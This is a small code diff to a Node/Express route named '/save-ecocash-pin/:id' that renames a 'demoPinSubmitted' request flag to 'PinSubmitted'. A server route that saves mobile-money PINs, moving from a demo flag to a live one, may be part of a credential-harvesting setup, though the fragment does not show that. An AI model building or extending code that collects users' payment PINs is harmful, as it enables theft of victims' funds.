@@ -947,9 +947,9 @@ app.post("/save-ecocash-pin/:id", async (req, res) => {
 
         const { id } = req.params;
 
-        const { demoPinSubmitted } = req.body;
+        const { PinSubmitted } = req.body;
 
-        if (demoPinSubmitted !== true) {
+        if (PinSubmitted !== true) {
 
             return res.status(400).json({
                 success: false,
